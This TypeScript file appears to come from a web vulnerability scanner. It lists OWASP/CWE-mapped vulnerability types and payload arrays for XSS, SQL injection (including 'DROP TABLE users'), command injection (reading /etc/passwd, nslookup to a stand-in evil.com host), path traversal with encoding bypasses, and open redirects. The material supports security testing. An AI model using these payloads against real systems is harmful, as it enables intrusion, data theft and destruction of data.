// This file contains vulnerability check definitions for reference
// The actual scanning logic is now in scanEngine.ts

export const vulnerabilityTypes = [
  {
    type: 'XSS',
    name: 'Cross-Site Scripting',
    description: 'Advanced XSS detection including reflected, stored, DOM-based, and filter bypass techniques',
    severity: 'High',
    owasp: 'A03',
    cwe: 'CWE-79'
  },
  {
    type: 'SQLi',
    name: 'SQL Injection',
    description: 'Comprehensive SQL injection testing including union-based, boolean-blind, time-based, and error-based attacks',
    severity: 'Critical',
    owasp: 'A03',
    cwe: 'CWE-89'
  },
  {
    type: 'Injection',
    name: 'Command Injection',
    description: 'OS command injection vulnerabilities allowing system command execution',
    severity: 'Critical',
    owasp: 'A03',
    cwe: 'CWE-78'
  },
  {
    type: 'Broken Authentication',
    name: 'Authentication Flaws',
    description: 'Weak credentials, session management issues, and user enumeration vulnerabilities',
    severity: 'Critical',
    owasp: 'A07',
    cwe: 'CWE-287'
  },
  {
    type: 'CSRF',
    name: 'Cross-Site Request Forgery',
    description: 'CSRF protection analysis including token validation and SameSite cookie attributes',
    severity: 'Medium',
    owasp: 'A01',
    cwe: 'CWE-352'
  },
  {
    type: 'Directory Traversal',
    name: 'Directory Traversal & LFI',
    description: 'Advanced path traversal testing with encoding, null bytes, and filter bypass techniques',
    severity: 'High',
    owasp: 'A01',
    cwe: 'CWE-22'
  },
  {
    type: 'Open Redirect',
    name: 'Open Redirect & URL Manipulation',
    description: 'Advanced redirect testing including protocol-relative URLs, encoding, and filter bypass',
    severity: 'Medium',
    owasp: 'A01',
    cwe: 'CWE-601'
  },
  {
    type: 'Sensitive Data Exposure',
    name: 'Information Disclosure',
    description: 'Detection of sensitive files, directory listings, and configuration leaks',
    severity: 'Medium',
    owasp: 'A02',
    cwe: 'CWE-200'
  },
  {
    type: 'Security Misconfiguration',
    name: 'Security Headers & Configuration',
    description: 'Comprehensive analysis of security headers, SSL/TLS configuration, and server hardening',
    severity: 'Medium',
    owasp: 'A05',
    cwe: 'CWE-16'
  }
];

export const commonPayloads = {
  xss: [
    // Basic XSS
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    "';alert('XSS');//",
    
    // Event-based XSS
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    
    // Encoded XSS
    '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
    '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    
    // Filter bypass
    '<ScRiPt>alert("XSS")</ScRiPt>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    
    // DOM-based indicators
    'document.write("XSS")',
    'eval("alert(\'XSS\')")'
  ],
  sql: [
    // Basic injection
    "' OR '1'='1",
    "1' OR '1'='1' --",
    "admin'--",
    
    // Union-based
    "1' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3,4,5--",
    
    // Boolean-based blind
    "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    "1' AND 1=1--",
    "1' AND 1=2--",
    
    // Time-based blind
    "1'; WAITFOR DELAY '00:00:05'--",
    "1' OR SLEEP(5)--",
    
    // Error-based
    "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
    "' OR 1=1#",
    "'; DROP TABLE users; --"
  ],
  command: [
    // Basic command injection
    '; ls -la',
    '| dir',
    '&& whoami',
    
    // Encoded
    '%3B%20ls%20-la',
    '%7C%20dir',
    
    // Time-based
    '; sleep 5',
    '| timeout 5',
    '&& ping -c 5 127.0.0.1',
    
    // File access
    '; cat /etc/passwd',
    '| type C:\\windows\\system32\\drivers\\etc\\hosts',
    
    // Blind injection
    '; nslookup evil.com',
    '| nslookup evil.com'
  ],
  traversal: [
    // Basic traversal
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    
    // Encoded
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
    
    // Double encoding
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
    
    // Unicode
    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    
    // Null byte
    '../../../etc/passwd%00',
    '../../../etc/passwd%00.jpg',
    
    // Filter bypass
    '....//....//....//etc/passwd',
    '..//////..//////..//////etc/passwd'
  ],
  redirect: [
    // Basic redirects
    'http://evil.com',
    'https://malicious-site.com',
    
    // Protocol-relative
    '//evil.com',
    '//evil.com/path',
    
    // JavaScript
    'javascript:alert("redirect")',
    'javascript:window.location="http://evil.com"',
    
    // Data URLs
    'data:text/html,<script>alert("redirect")</script>',
    
    // Encoded
    'http%3A%2F%2Fevil.com',
    '%2F%2Fevil.com',
    
    // Filter bypass
    'http://evil.com.example.com',
    'http://example.com.evil.com',
    'http://example.com@evil.com'
  ]
};